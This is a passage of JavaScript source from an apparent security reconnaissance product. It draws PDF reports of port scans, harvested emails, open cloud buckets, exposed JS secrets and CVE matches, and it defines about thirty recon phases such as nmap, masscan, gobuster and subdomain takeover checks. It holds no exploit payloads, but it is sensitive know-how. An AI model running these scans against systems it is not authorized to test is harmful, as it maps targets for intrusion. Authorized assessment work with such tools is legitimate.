      ["Certificates seen", String(r.crtsh.certs_seen || 0)],
      ["Unique subdomains", String((r.crtsh.subdomains||[]).length)],
      ["First issued",      r.crtsh.first_seen ? String(r.crtsh.first_seen).split("T")[0] : "—"],
      ["Last issued",       r.crtsh.last_seen  ? String(r.crtsh.last_seen ).split("T")[0] : "—"],
    ];
    y = tHead(["FIELD","VALUE"], [55, 125], y);
    ctRows.forEach((row, i) => {
      chk(7); fillR(margin, y, contentW, 7, i%2===0 ? LIGHT : WHITE);
      txt(row[0], margin+3, y+5, 8.5, GRAY, true);
      txt(row[1], margin+58, y+5, 8.5, DARK);
      y += 7;
    });
    if((r.crtsh.top_issuers || []).length > 0){
      y += 2; chk(20);
      fillR(margin, y, contentW, 7, LBLUE);
      txt("Top Certificate Issuers", margin+4, y+5, 9, BLUE, true);
      y += 8;
      r.crtsh.top_issuers.forEach((iss, i) => {
        chk(7); fillR(margin, y, contentW, 7, i%2===0 ? LIGHT : WHITE);
        const issName = String(iss.issuer || "Unknown");
        const lines = doc.splitTextToSize(issName, contentW - 40);
        const rh = Math.max(7, lines.length * 3.8 + 3);
        chk(rh + 1);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(lines, margin+3, y+5);
        txt(iss.count + " cert" + (iss.count === 1 ? "" : "s"),
            margin+contentW-4, y+5, 8, BLUE, true, "right");
        y += rh;
      });
    }
    y += 6;
  }

  // ── Harvester ──────────────────────────────────────────────
  if(r.harvester){ const emails=r.harvester.emails||[]; const hosts=r.harvester.hosts||[];
    chk(30); y = sHead("OSINT Harvesting (theHarvester)",y);
    if(emails.length===0 && hosts.length===0){
      fillR(margin,y,contentW,8,LIGHT); txt("No emails or hosts discovered by theHarvester.",margin+4,y+5.5,8.5,GRAY); y+=12;
    } else {
      if(emails.length>0){ y = tHead(["EMAIL ADDRESS"],[180],y); emails.slice(0,20).forEach((e,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); doc.setFont("Arial","normal");doc.setFontSize(8.5);doc.setTextColor(...DARK);doc.text(String(e),margin+3,y+5); y+=7; }); y+=4; }
      if(hosts.length>0){ y = tHead(["IP / HOST"],[180],y); hosts.slice(0,20).forEach((h,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); doc.setFont("Arial","normal");doc.setFontSize(8.5);doc.setTextColor(...DARK);doc.text(String(h),margin+3,y+5); y+=7; }); }
      y+=6;
    } }

  // ── Shodan ─────────────────────────────────────────────────
  if(r.shodan && !r.shodan.error && r.shodan.ip){ chk(30); y = sHead("Shodan Internet Intelligence",y);
    const sf=[["IP",r.shodan.ip],["Organization",r.shodan.org],["ISP",r.shodan.isp],["Country",r.shodan.country],["OS",r.shodan.os]].filter(([,v])=>v);
    y = tHead(["FIELD","VALUE"],[45,135],y);
    sf.forEach((f,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(f[0],margin+3,y+5,8.5,GRAY,true); txt(String(f[1]),margin+48,y+5,8.5,DARK); y+=7; });
    if(r.shodan.ports?.length){ chk(12); y+=4; txt("Open Ports: "+r.shodan.ports.join(", "),margin+3,y,8.5,BLUE,true); y+=8; }
    if(r.shodan.vulns?.length){ chk(12); txt("Known Vulnerabilities: "+r.shodan.vulns.join(", "),margin+3,y,8.5,[162,28,28],true); y+=8; }
    y+=4; }

  // ── Ports ──────────────────────────────────────────────────
  const allPorts=[...new Map([...(r.masscan?.ports||[]).map(p=>({...p,src:"masscan"})),...(r.nmap?.ports||[]).map(p=>({...p,src:"nmap"})),...(r.services?.ports||[]).map(p=>({...p,src:"services"}))].map(p=>[p.port,p])).values()];
  // Fallback: parse raw nmap output if structured ports are empty
  if(allPorts.length===0 && r.nmap?.raw_output){
    const raw = r.nmap.raw_output;
    raw.split("\n").forEach(line=>{
      const m = line.trim().match(/^(\d+)\/(tcp|udp)\s+open\s+(\S+)\s*(.*)/);
      if(m) allPorts.push({port:parseInt(m[1]),proto:m[2],state:"open",service:m[3],version:m[4].trim(),src:"nmap-raw"});
    });
  }
  if(allPorts.length>0){ chk(30); y = sHead("Open Ports & Services",y);
    y = tHead(["PORT","PROTO","STATE","SERVICE","VERSION"],[20,18,18,45,79],y);
    allPorts.forEach((p,i)=>{
      const scripts = p.scripts || [];
      const rowH = scripts.length > 0 ? 7 + scripts.length * 4 : 7;
      chk(rowH+2);
      fillR(margin,y,contentW,rowH,i%2===0?LIGHT:WHITE);
      doc.setFont("Arial","bold");doc.setFontSize(9);doc.setTextColor(...DARK);
      doc.text(String(p.port||""),margin+3,y+5);
      txt(p.protocol||p.proto||"tcp",margin+23,y+5,8,GRAY);
      rrect(margin+41,y+1.5,14,4,1,[220,252,231]);
      doc.setFont("Arial","bold");doc.setFontSize(6.5);doc.setTextColor(21,128,61);
      doc.text("open",margin+43,y+5);
      txt(p.service||"—",margin+59,y+5,8,DARK);
      const vl=doc.splitTextToSize(String(p.version||""),72);
      doc.setFont("Arial","normal");doc.setFontSize(7.5);doc.setTextColor(...GRAY);
      doc.text(vl[0],margin+104,y+5);
      if(scripts.length>0){
        scripts.slice(0,4).forEach((s,si)=>{
          doc.setFont("Arial","italic");doc.setFontSize(6.5);doc.setTextColor(...BLUE);
          const sl=doc.splitTextToSize("  "+s,170);
          doc.text(sl[0],margin+6,y+9+(si*4));
        });
      }
      y+=rowH;
    });
    y+=6; }

  // ── OS ─────────────────────────────────────────────────────
  // Honest output: shows confidence ONLY when the backend produced a real
  // signal; falls back to "Indeterminate ..." when the target is CDN-fronted
  // or no OS-revealing data was in scope. Lists supporting evidence (HTTP
  // Server header, detected CDN) so the customer can audit the conclusion.
  if(r.os && r.os.os){
    chk(30); y = sHead("OS Fingerprinting", y);
    const conf = r.os.accuracy;
    const osLabel = conf ? `${r.os.os}  (${conf}% confidence)` : r.os.os;
    const osLines = doc.splitTextToSize(osLabel, contentW - 42);
    const osRowH  = Math.max(10, osLines.length * 5 + 4);
    chk(osRowH + 2);
    fillR(margin, y, contentW, osRowH, LIGHT);
    txt("Detected OS:", margin+4, y+7, 9, GRAY, true);
    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...BLUE);
    doc.text(osLines, margin+36, y+7);
    y += osRowH + 4;

    // CDN/edge banner if the origin is hidden — flags this finding clearly
    if(r.os.cdn){
      chk(10);
      fillR(margin, y, contentW, 8, [254, 243, 199]);
      fillR(margin, y, 3, 8, [217, 119, 6]);
      txt(`Edge proxy detected: ${r.os.cdn} — origin OS is not directly observable.`,
          margin+6, y+5.5, 8, [120, 53, 15]);
      y += 11;
    }

    // Evidence list — what the verdict is based on
    if(r.os.evidence && r.os.evidence.length > 0){
      chk(8 + r.os.evidence.length * 5);
      fillR(margin, y, contentW, 7, LBLUE);
      txt("Evidence", margin+4, y+5, 8.5, BLUE, true);
      y += 8;
      r.os.evidence.forEach((e, i) => {
        const eLines = doc.splitTextToSize(String(e), contentW - 12);
        const eH = Math.max(6, eLines.length * 4 + 2);
        chk(eH + 1);
        fillR(margin, y, contentW, eH, i%2===0 ? LIGHT : WHITE);
        doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
        doc.text(eLines, margin+5, y+4.5);
        y += eH;
      });
      y += 3;
    }

    if(r.os.matches && r.os.matches.length > 0){
      chk(20); y = sHead("OS Match Candidates", y);
      r.os.matches.slice(0, 5).forEach((m, i) => {
        const mLines = doc.splitTextToSize(m.name || "", contentW - 40);
        const mH = Math.max(8, mLines.length * 4.5 + 3);
        chk(mH + 2);
        fillR(margin, y, contentW, mH, i%2===0 ? LIGHT : WHITE);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(mLines, margin+4, y+5.5);
        txt(m.accuracy ? m.accuracy + "%" : "n/a",
            margin+contentW-8, y+5.5, 8, BLUE, true, "right");
        y += mH;
      });
      y += 4;
    }
  }

  // ── BANNER GRABBING ────────────────────────────────────────
  const bannerMap = r.banner?.banners || {};
  const bannerEntries = Object.entries(bannerMap);
  if(bannerEntries.length>0){
    chk(30); y = sHead("Service Banner Grabbing",y);
    const bCols=["PORT","BANNER"]; const bWidths=[25,contentW-25];
    y = tHead(bCols,bWidths,y);
    bannerEntries.forEach(([port,banner],i)=>{
      // Strip any remaining non-printable chars client-side too
      const cleanB = String(banner).replace(/[^\x20-\x7E]/g," ").replace(/\s+/g," ").trim().substring(0,250);
      const lines = doc.splitTextToSize(cleanB || "(binary handshake)", contentW - 30);
      const rh = Math.max(8, lines.length*4.5+4);
      chk(rh+2);
      fillR(margin,y,contentW,rh,i%2===0?LIGHT:WHITE);
      txt(port,margin+3,y+5.5,8,BLUE,true);
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
      doc.text(lines,margin+28,y+5.5);
      y+=rh;
    });
    y+=4;
  }

  // ── DIRECTORY ENUMERATION (gobuster / python-fuzz) ─────────
  // Renders the 100+ path wordlist sweep with color-coded status codes.
  // 200/301/302 are "live" (green/blue); 403 is "exists but forbidden"
  // (amber); everything else is gray. Customer can hand this to a
  // junior pentester to start manual review.
  if(r.gobuster && Array.isArray(r.gobuster.found) && r.gobuster.found.length > 0){
    chk(30); y = sHead("Directory Enumeration", y);
    if(r.gobuster.engine){
      chk(6);
      fillR(margin, y, contentW, 6, LIGHT);
      txt(`Engine: ${r.gobuster.engine}  ·  ${r.gobuster.found.length} path(s) discovered`,
          margin+4, y+4.5, 7.5, GRAY);
      y += 8;
    }
    y = tHead(["STATUS","PATH"], [25, contentW-25], y);
    r.gobuster.found.slice(0, 80).forEach((item, i) => {
      const st = item.status;
      const stColor = st === 200 ? [22,163,74]
                    : (st === 301 || st === 302) ? [37,99,235]
                    : st === 403 ? [217,119,6]
                    : [100,116,139];
      const stBg = st === 200 ? [220,252,231]
                 : (st === 301 || st === 302) ? [219,234,254]
                 : st === 403 ? [254,243,199]
                 : [241,245,249];
      chk(7);
      fillR(margin, y, contentW, 7, i%2===0 ? LIGHT : WHITE);
      rrect(margin+3, y+1.5, 18, 4, 1, stBg);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(...stColor);
      doc.text(String(st || "?"), margin+5, y+5);
      const path = String(item.path || "");
      doc.setFont("Courier","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
      doc.text(path.substring(0, 100), margin+28, y+5);
      y += 7;
    });
    if(r.gobuster.found.length > 80){
      chk(7);
      fillR(margin, y, contentW, 7, LIGHT);
      txt(`... and ${r.gobuster.found.length - 80} more paths`,
          margin+4, y+5, 7.5, GRAY);
      y += 7;
    }
    y += 6;
  } else if(r.gobuster && Array.isArray(r.gobuster.found) && r.gobuster.found.length === 0){
    // Be explicit when the sweep returned zero — customers shouldn't
    // wonder if it ran. Common on CDN-fronted sites where Fastly/
    // Cloudflare returns identical 404s for every path.
    chk(20); y = sHead("Directory Enumeration", y);
    fillR(margin, y, contentW, 10, LIGHT);
    txt("No exposed paths discovered. Common when the target sits behind a CDN that normalizes all 404s.",
        margin+4, y+6.5, 8.5, GRAY);
    y += 14;
  }

  // ─── ASN / IP Ownership ────────────────────────────────────
  if(r.asn && (r.asn.asn || r.asn.ip)){
    chk(30); y = sHead("ASN / IP Ownership (Team-Cymru)", y);
    const rows = [
      ["IP",        r.asn.ip],
      ["ASN",       r.asn.asn ? `AS${r.asn.asn}` : null],
      ["Owner",     r.asn.as_owner],
      ["Prefix",    r.asn.prefix],
      ["Country",   r.asn.country],
      ["Registry",  r.asn.registry],
      ["Allocated", r.asn.allocated],
    ].filter(p => p[1]);
    y = tHead(["FIELD","VALUE"],[45,contentW-45],y);
    rows.forEach((row,i)=>{
      chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      txt(row[0],margin+3,y+5,8.5,GRAY,true);
      doc.setFont("Courier","normal"); doc.setFontSize(8.5); doc.setTextColor(...DARK);
      doc.text(String(row[1]),margin+48,y+5);
      y+=7;
    });
    y+=6;
  }

  // ─── Shodan InternetDB (free, no API key) ──────────────────
  if(r.internetdb && r.internetdb.found){
    chk(30); y = sHead("Shodan InternetDB Lookup", y);
    chk(6); fillR(margin,y,contentW,6,LIGHT);
    txt(`IP ${r.internetdb.ip}  ·  ${(r.internetdb.ports||[]).length} ports  ·  ${(r.internetdb.vulns||[]).length} CVEs  ·  ${(r.internetdb.tags||[]).length} tags  (free, no API key)`,
        margin+4,y+4.5,7.5,GRAY); y+=8;
    if((r.internetdb.ports||[]).length>0){
      y=tHead(["FIELD","VALUE"],[35,contentW-35],y);
      const rows = [
        ["Ports",    (r.internetdb.ports||[]).join(", ")],
        ["Hostnames",(r.internetdb.hostnames||[]).slice(0,8).join(", ")],
        ["Tags",     (r.internetdb.tags||[]).join(", ")],
        ["CVEs",     (r.internetdb.vulns||[]).slice(0,12).join(", ")],
        ["CPEs",     (r.internetdb.cpes||[]).slice(0,6).join(" / ")],
      ].filter(p=>p[1]);
      rows.forEach((row,i)=>{
        const lines = doc.splitTextToSize(String(row[1]),contentW-38);
        const h = Math.max(7,lines.length*3.8+2);
        chk(h+1); fillR(margin,y,contentW,h,i%2===0?LIGHT:WHITE);
        txt(row[0],margin+3,y+5,8.5,GRAY,true);
        doc.setFont("Arial","normal");doc.setFontSize(8);doc.setTextColor(...DARK);
        lines.forEach((ln,li)=>doc.text(ln,margin+38,y+5+li*3.8));
        y+=h;
      });
    }
    y+=6;
  } else if(r.internetdb && r.internetdb.skipped_reason){
    chk(14); y = sHead("Shodan InternetDB Lookup", y);
    fillR(margin,y,contentW,8,LIGHT);
    txt(r.internetdb.skipped_reason,margin+4,y+5.5,8,GRAY); y+=10;
  }

  // ─── Favicon Fingerprint ───────────────────────────────────
  if(r.favicon && r.favicon.found){
    chk(22); y = sHead("Favicon Fingerprint", y);
    y = tHead(["FIELD","VALUE"],[45,contentW-45],y);
    const rows = [
      ["Favicon URL",    r.favicon.favicon_url],
      ["Shodan hash",    String(r.favicon.shodan_hash)],
      ["Matched service",r.favicon.matched_service || "(unknown / custom)"],
      ["Shodan pivot",   r.favicon.shodan_query],
    ].filter(p=>p[1]);
    rows.forEach((row,i)=>{
      chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      txt(row[0],margin+3,y+5,8.5,GRAY,true);
      doc.setFont("Courier","normal");doc.setFontSize(8);doc.setTextColor(...DARK);
      doc.text(String(row[1]).substring(0,90),margin+48,y+5);
      y+=7;
    });
    y+=6;
  }

  // ─── Cloud Bucket Finder ───────────────────────────────────
  if(r.cloudbuckets && (r.cloudbuckets.open_buckets || r.cloudbuckets.existing_buckets)){
    const open  = r.cloudbuckets.open_buckets    || [];
    const exist = r.cloudbuckets.existing_buckets || [];
    if(open.length>0 || exist.length>0){
      chk(20); y = sHead("Cloud Buckets (S3 / GCS / Azure)", y);
      y = tHead(["STATUS","PROVIDER","BUCKET NAME","URL"],[25,25,40,contentW-90],y);
      open.forEach((b,i)=>{
        chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
        rrect(margin+3,y+1.5,20,4,1,[254,202,202]);
        doc.setFont("Arial","bold");doc.setFontSize(6.5);doc.setTextColor(162,28,28);
        doc.text("OPEN",margin+5,y+5);
        txt(b.provider,margin+30,y+5,8,DARK,true);
        doc.setFont("Courier","normal");doc.setFontSize(7.5);doc.setTextColor(...DARK);
        doc.text(String(b.name||"").substring(0,30),margin+57,y+5);
        doc.text(String(b.url||"").substring(0,80),margin+99,y+5);
        y+=7;
      });
      exist.forEach((b,i)=>{
        chk(7); fillR(margin,y,contentW,7,(open.length+i)%2===0?LIGHT:WHITE);
        rrect(margin+3,y+1.5,20,4,1,[254,243,199]);
        doc.setFont("Arial","bold");doc.setFontSize(6.5);doc.setTextColor(120,53,15);
        doc.text("EXISTS",margin+5,y+5);
        txt(b.provider,margin+30,y+5,8,DARK,true);
        doc.setFont("Courier","normal");doc.setFontSize(7.5);doc.setTextColor(...DARK);
        doc.text(String(b.name||"").substring(0,30),margin+57,y+5);
        doc.text(String(b.url||"").substring(0,80),margin+99,y+5);
        y+=7;
      });
      y+=6;
    }
  }

  // ─── JS Secret Scanner ─────────────────────────────────────
  if(r.secrets && Array.isArray(r.secrets.findings) && r.secrets.findings.length > 0){
    chk(20); y = sHead("JS Secret Scanner", y);
    chk(6); fillR(margin,y,contentW,6,LIGHT);
    txt(`${r.secrets.findings.length} secret(s) found across ${(r.secrets.js_files||[]).length} JS file(s)`,
        margin+4,y+4.5,7.5,GRAY); y+=8;
    r.secrets.findings.slice(0,20).forEach((f,i)=>{
      const lines = doc.splitTextToSize(String(f.detail||""),contentW-30);
      const h = Math.max(8,lines.length*3.6+2);
      chk(h+1); fillR(margin,y,contentW,h,i%2===0?LIGHT:WHITE);
      const sevC = f.severity==="CRITICAL"?[162,28,28]:f.severity==="HIGH"?[194,65,12]:[120,53,15];
      const sevB = f.severity==="CRITICAL"?[254,202,202]:f.severity==="HIGH"?[254,215,170]:[254,243,199];
      rrect(margin+3,y+2,20,5,1,sevB);
      doc.setFont("Arial","bold");doc.setFontSize(6.5);doc.setTextColor(...sevC);
      doc.text(f.severity,margin+4,y+5.5);
      doc.setFont("Arial","normal");doc.setFontSize(8);doc.setTextColor(...DARK);
      lines.forEach((ln,li)=>doc.text(ln,margin+26,y+5.5+li*3.6));
      y+=h;
    });
    y+=6;
  }

  // ─── JS Endpoint Extractor ─────────────────────────────────
  if(r.jsendpoints && Array.isArray(r.jsendpoints.paths) && r.jsendpoints.paths.length > 0){
    chk(20); y = sHead("JS Endpoint Extractor", y);
    chk(6); fillR(margin,y,contentW,6,LIGHT);
    txt(`${r.jsendpoints.paths.length} path(s) + ${(r.jsendpoints.discovered||[]).length - (r.jsendpoints.paths||[]).length} external URL(s) across ${(r.jsendpoints.js_files||[]).length} JS file(s)`,
        margin+4,y+4.5,7.5,GRAY); y+=8;
    y = tHead(["#","PATH"],[12,contentW-12],y);
    r.jsendpoints.paths.slice(0,60).forEach((p,i)=>{
      chk(6); fillR(margin,y,contentW,6,i%2===0?LIGHT:WHITE);
      txt(String(i+1),margin+3,y+4.5,7.5,GRAY);
      doc.setFont("Courier","normal");doc.setFontSize(7.5);doc.setTextColor(...DARK);
      doc.text(String(p).substring(0,140),margin+15,y+4.5);
      y+=6;
    });
    if(r.jsendpoints.paths.length>60){
      chk(6); fillR(margin,y,contentW,6,LIGHT);
      txt(`... and ${r.jsendpoints.paths.length-60} more endpoints`,margin+4,y+4.5,7.5,GRAY);
      y+=6;
    }
    y+=6;
  }

  // ─── Wayback Machine ───────────────────────────────────────
  if(r.wayback && (r.wayback.total||0) > 0){
    chk(20); y = sHead("Wayback Machine (archive.org)", y);
    chk(6); fillR(margin,y,contentW,6,LIGHT);
    txt(`${r.wayback.total} archived URL(s) total  ·  ${r.wayback.interesting_total||0} interesting (admin/api/.env/.git)`,
        margin+4,y+4.5,7.5,GRAY); y+=8;
    const list = (r.wayback.interesting && r.wayback.interesting.length>0) ? r.wayback.interesting : (r.wayback.discovered||[]);
    list.slice(0,40).forEach((u,i)=>{
      chk(6); fillR(margin,y,contentW,6,i%2===0?LIGHT:WHITE);
      doc.setFont("Courier","normal");doc.setFontSize(7);doc.setTextColor(...DARK);
      doc.text(String(u).substring(0,150),margin+4,y+4.5);
      y+=6;
    });
    if(list.length>40){
      chk(6); fillR(margin,y,contentW,6,LIGHT);
      txt(`... and ${list.length-40} more archived URLs`,margin+4,y+4.5,7.5,GRAY); y+=6;
    }
    y+=6;
  }

  // ─── Parameter Discovery ───────────────────────────────────
  if(r.params && Array.isArray(r.params.params) && r.params.params.length > 0){
    chk(20); y = sHead("Parameter Discovery", y);
    chk(6); fillR(margin,y,contentW,6,LIGHT);
    const src = r.params.sources || {};
    txt(`${r.params.params.length} param(s) discovered  ·  sources: query=${src.query||0}, form=${src.form||0}, json=${src.json||0}, js=${src.js_var||0}`,
        margin+4,y+4.5,7.5,GRAY); y+=8;
    // Three-column layout — params are short, fit many per row
    const pCols = 3;
    const pColW = contentW / pCols;
    for(let i=0;i<r.params.params.length && i<60;i+=pCols){
      const rowH = 6;
      chk(rowH+1); fillR(margin,y,contentW,rowH,(i/pCols)%2===0?LIGHT:WHITE);
      for(let c=0;c<pCols && i+c<r.params.params.length;c++){
        doc.setFont("Courier","normal");doc.setFontSize(7.5);doc.setTextColor(...DARK);
        doc.text(String(r.params.params[i+c]).substring(0,38),margin+3+c*pColW,y+4.5);
      }
      y+=rowH;
    }
    if(r.params.params.length>60){
      chk(6); fillR(margin,y,contentW,6,LIGHT);
      txt(`... and ${r.params.params.length-60} more params`,margin+4,y+4.5,7.5,GRAY); y+=6;
    }
    y+=6;
  }

  // ── CVE Matches (NVD) ──────────────────────────────────────
  if(r.cve_match && r.cve_match.summary && (r.cve_match.summary.total_cves||0) > 0){
    chk(40); y = sHead("CVE Matches (NVD)", y);
    const sum = r.cve_match.summary;
    chk(8); fillR(margin, y, contentW, 7, LIGHT);
    txt(`${sum.total_cves} CVE(s) found  ·  ${sum.critical_cves} critical  ·  ${sum.high_cves} high  ·  ${sum.medium_cves||0} medium  ·  ${sum.low_cves||0} low`,
        margin+4, y+5, 8.5, BLUE, true);
    y += 9;
    const svcs = r.cve_match.services_detected || [];
    if(svcs.length>0){
      chk(6); fillR(margin, y, contentW, 6, WHITE);
      const svcList = svcs.map(s=>`${s.vendor}/${s.product} ${s.version}`).join(", ");
      txt(`Services detected: ${svcList.substring(0,150)}`, margin+4, y+4.5, 7.5, GRAY);
      y += 7;
    }
    y = tHead(["CVE","CVSS","SEVERITY","DESCRIPTION"],[28,12,22,118],y);
    const cves = (r.cve_match.cves||[]).slice(0, 30);
    cves.forEach((c, i) => {
      const sevColor = c.cvss_severity === "CRITICAL" ? [162,28,28]
                     : c.cvss_severity === "HIGH"     ? [194,65,12]
                     : c.cvss_severity === "MEDIUM"   ? [202,138,4]
                     :                                   [55,65,81];
      const sevBg    = c.cvss_severity === "CRITICAL" ? [254,226,226]
                     : c.cvss_severity === "HIGH"     ? [255,237,213]
                     : c.cvss_severity === "MEDIUM"   ? [254,243,199]
                     :                                   [241,245,249];
      chk(8);
      fillR(margin, y, contentW, 7, i%2===0 ? LIGHT : WHITE);
      doc.setFont("Courier","bold"); doc.setFontSize(7); doc.setTextColor(...BLUE);
      doc.text(String(c.id||"").substring(0,16), margin+3, y+4.8);
      doc.setFont("Arial","bold"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
      doc.text(String(c.cvss_score ?? "?"), margin+31, y+4.8);
      rrect(margin+44, y+1.5, 20, 5, 1, sevBg);
      doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...sevColor);
      doc.text(String(c.cvss_severity||"?"), margin+46, y+5);
      doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      const dLines = doc.splitTextToSize(String(c.description||""), 113);
      doc.text(dLines[0] || "", margin+68, y+4.8);
      y += 7;
    });
    if(r.cve_match.cves && r.cve_match.cves.length > 30){
      chk(6); fillR(margin, y, contentW, 6, LIGHT);
      txt(`... and ${r.cve_match.cves.length-30} more CVEs (top 30 shown by severity)`, margin+4, y+4.5, 7.5, GRAY);
      y += 6;
    }
    y += 6;
  }

  // ── END OF REPORT ──────────────────────────────────────────
  if(y+32>284){doc.addPage();y=18;drawHeader();}
  const bY=y+5;
  fillR(margin,bY,contentW,30,LBLUE); fillR(margin,bY,3,30,BLUE);
  txt("— END OF REPORT —",pageW/2,bY+8,10,BLUE,true,"center");
  txt("Generated by VulnusLab — automated reconnaissance by VulnusLab engine.",pageW/2,bY+14,6.5,GRAY,false,"center");
  txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.",pageW/2,bY+18,6,GRAY,false,"center");
  txt("vulnuslab.com  ·  support@vulnuslab.com",pageW/2,bY+25,7,BLUE,true,"center");

  // ── BORDER ALL PAGES ───────────────────────────────────────
  const total = doc.internal.getNumberOfPages();
  for(let i=1;i<=total;i++){
    doc.setPage(i);
    doc.setDrawColor(...BLUE); doc.setLineWidth(1.2); doc.rect(0,0,210,297,"S");
    if(i>=2){ txt("VulnusLab | CONFIDENTIAL  ·  vulnuslab.com",margin,290,6.5,GRAY); txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right"); }
  }
  doc.save(`recon_${_pdfFn(target)}_${_pdfDt()}.pdf`);
  }; // end _doGen
  _doGen();
}

// ═══════════════════════════════════════════════════════════════
//  RECON MODULE
// ═══════════════════════════════════════════════════════════════
const RECON_PHASES = [
  {name:"WHOIS Lookup",          tool:"whois",      endpoint:"/api/recon/whois",      icon:"🌐"},
  {name:"DNS Records",           tool:"dns",        endpoint:"/api/recon/dns",        icon:"🔎"},
  {name:"DNS Recon",             tool:"dnsrecon",   endpoint:"/api/recon/dnsrecon",   icon:"🕵️"},
  {name:"Subdomain Discovery",   tool:"subdomains", endpoint:"/api/recon/subdomains", icon:"🌍"},
  {name:"Cert Transparency",     tool:"crtsh",      endpoint:"/api/recon/crtsh",      icon:"📜"},
  {name:"Deep Subdomain (amass)",tool:"amass",      endpoint:"/api/recon/amass",      icon:"🕸️"},
  {name:"OSINT Harvesting",      tool:"harvester",  endpoint:"/api/recon/harvester",  icon:"🔬"},
  {name:"Shodan Lookup",         tool:"shodan",     endpoint:"/api/recon/shodan",     icon:"👁️"},
  {name:"Fast Port Scan",        tool:"masscan",    endpoint:"/api/recon/masscan",    icon:"⚡"},
  {name:"Deep Port Scan",        tool:"nmap",       endpoint:"/api/recon/nmap",       icon:"🔌"},
  {name:"Service Detection",     tool:"services",   endpoint:"/api/recon/services",   icon:"⚙️"},
  {name:"OS Fingerprinting",     tool:"os",         endpoint:"/api/recon/os",         icon:"💻"},
  {name:"Banner Grabbing",       tool:"banner",     endpoint:"/api/recon/banner",     icon:"🏷️"},
  {name:"Directory Enumeration", tool:"gobuster",   endpoint:"/api/recon/gobuster",   icon:"📁"},
  // ── Pure-Python URL Discovery Suite (vol. 1) ────────────────
  // These pull hidden URLs out of (1) JS bundles referenced by the homepage,
  // (2) the Wayback Machine archive, (3) robots.txt + sitemap.xml +
  // .well-known files. Together they solve the "SPA returns 0 findings"
  // problem — WebApp scanners can later test these discovered URLs.
  {name:"JS Endpoint Extractor", tool:"jsendpoints",endpoint:"/api/recon/jsendpoints",icon:"📜"},
  {name:"Wayback Machine",       tool:"wayback",    endpoint:"/api/recon/wayback",    icon:"⏪"},
  {name:"robots + sitemap",      tool:"robotsmap",  endpoint:"/api/recon/robotsmap",  icon:"🗺"},
  // ── Pure-Python Recon Suite (vol. 2) ────────────────────────
  // BFS crawler + param discovery feed the WebApp scanners.
  // Favicon hash, cloud buckets, secrets, and ASN finish the recon picture.
  {name:"BFS Crawler",           tool:"crawl",      endpoint:"/api/recon/crawl",      icon:"🕷"},
  {name:"Parameter Discovery",   tool:"params",     endpoint:"/api/recon/params",     icon:"❓"},
  {name:"Favicon Fingerprint",   tool:"favicon",    endpoint:"/api/recon/favicon",    icon:"🎯"},
  {name:"Cloud Bucket Finder",   tool:"cloudbuckets",endpoint:"/api/recon/cloudbuckets",icon:"☁"},
  {name:"JS Secret Scanner",     tool:"secrets",    endpoint:"/api/recon/secrets",    icon:"🔑"},
  {name:"ASN / IP Ownership",    tool:"asn",        endpoint:"/api/recon/asn",        icon:"🌐"},
  // Free Shodan alternative — InternetDB API requires NO API key, so every
  // customer gets Shodan-equivalent CVE + port + tag intel for any internet-
  // resolvable target. Pairs with the keyed Shodan tile above.
  {name:"Free Shodan (InternetDB)",tool:"internetdb",endpoint:"/api/recon/internetdb",icon:"🆓"},
  {name:"CVE Matching (NVD)",     tool:"cve_match", endpoint:"/api/recon/cve_match",  icon:"🚨"},
  {name:"Subdomain Takeover",     tool:"subdomain_takeover", endpoint:"/api/recon/subdomain_takeover", icon:"🎯"},
  {name:"WAF / CDN Fingerprint",  tool:"waf_cdn",   endpoint:"/api/recon/waf_cdn",    icon:"🛡️"},
  {name:"SSL / TLS Deep Scan",    tool:"ssl_deep",  endpoint:"/api/recon/ssl_deep",   icon:"🔐"},
  {name:"Email Security",     tool:"email_audit",    endpoint:"/api/recon/email_audit",   icon:"✉️"},
  {name:"WAF/CDN Detect",     tool:"waf_detect",    endpoint:"/api/recon/waf_detect",   icon:"🛡️"},
  {name:"Subdomain Takeover",     tool:"takeover_check",    endpoint:"/api/recon/takeover_check",   icon:"🎯"}
];

function ReconModule({token, onRunningChange}) {
  const _notifyRunning = onRunningChange || (() => {});
  const [target,         setTarget]   = useState("");
  const [running,        setRunning]  = useState(false);
  const [curPhase,       setCurPhase] = useState(-1);
  const [done,           setDone]     = useState([]);
  const [failed,         setFailed]   = useState([]);
  const [allResults,     setAll]      = useState({});
  const [finished,       setFinished] = useState(false);
  const [lines,          setLines]    = useState(["Ready — enter a domain or IP and click Start Recon"]);
  const [tab,            setTab]      = useState("phases");
  const [stopped,        setStopped]  = useState(false);
  const [selectedPhases, setSelected] = useState(() => new Set(RECON_PHASES.map((_,i)=>i)));
  const stopRef = useRef(false);
  const logRef  = useRef(null);

  const add = l => setLines(p => [...p, l]);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [lines]);

  const stop = () => { stopRef.current = true; setStopped(true); };

  const togglePhase = i => setSelected(prev => {
    const next = new Set(prev);
    next.has(i) ? next.delete(i) : next.add(i);
    return next;
  });

  const run = async () => {
    if (!target.trim()) return;
    stopRef.current = false; setStopped(false);
    setRunning(true); _notifyRunning(true); setDone([]); setFailed([]); setAll({}); setFinished(false);
    setTab("phases");
